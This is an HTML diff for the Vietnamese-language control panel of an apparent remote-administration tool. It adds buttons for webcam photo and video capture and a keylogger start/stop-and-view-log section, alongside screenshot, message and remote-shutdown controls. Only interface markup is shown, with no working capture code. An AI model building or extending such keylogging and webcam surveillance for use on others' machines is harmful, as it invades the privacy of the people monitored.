@@ -67,24 +67,33 @@
             <div class="col-right">
                 <fieldset class="control-group">
                     <legend>Tác vụ Màn hình</legend>
-                    <button id="btn-screen-capture">Chụp màn hình (Screenshot)</button>
-                    <div class="input-with-button">
-                        <input type="number" id="record-duration" value="10" min="1" placeholder="Giây">
-                        <button id="btn-screen-record">Quay Video (Giây)</button>
+                    <button id="btn-screen-capture">Chụp ảnh màn hình</button>
+                </fieldset>
+
+                <fieldset class="control-group">
+                    <legend>Tác vụ Webcam</legend>
+                    <button id="btn-webcam-capture">Chụp ảnh Webcam</button>
+                    <div class="input-with-button" style="margin-top: 10px;">
+                        <input type="number" id="webcam-duration" value="10" min="1" placeholder="Giây">
+                        <button id="btn-webcam-record">Quay Video Webcam (Giây)</button>
+                    </div>
+                </fieldset>
+
+                <fieldset class="control-group">
+                    <legend>Keylogger</legend>
+                    <div style="display: flex; gap: 10px;">
+                        <button id="btn-keylogger-start" class="btn-warning">Bắt đầu ghi</button>
+                        <button id="btn-keylogger-stop" class="btn-neutral">Dừng & Xem Log</button>
                     </div>
                 </fieldset>
                 
-                <fieldset class="control-group">
-                    <legend>Gửi tin nhắn</legend>
+                <fieldset class="control-group" style="margin-top: 20px;">
+                    <legend>Khác</legend>
                     <div class="input-with-button">
-                        <input type="text" id="message-text" placeholder="Nội dung tin nhắn...">
+                        <input type="text" id="message-text" placeholder="Gửi tin nhắn...">
                         <button id="btn-send-message">Gửi</button>
                     </div>
-                </fieldset>
-                
-                <fieldset class="control-group">
-                    <legend>Hệ thống</legend>
-                    <button id="btn-shutdown" class="btn-danger">TẮT MÁY CHỦ (SHUTDOWN)</button>
+                    <button id="btn-shutdown" class="btn-danger" style="margin-top: 10px;">TẮT MÁY CHỦ</button>
                 </fieldset>
             </div>
         </div>
@@ -97,9 +106,7 @@
         <div class="modal-content">
             <span id="close-modal" class="close-btn">&times;</span>
             <h2 id="modal-title">Kết quả</h2>
-            
             <div id="modal-body"></div>
-            
             <div id="modal-footer" class="hidden">
                 <a id="download-link" href="#" download class="btn-download">Tải xuống</a>
             </div>
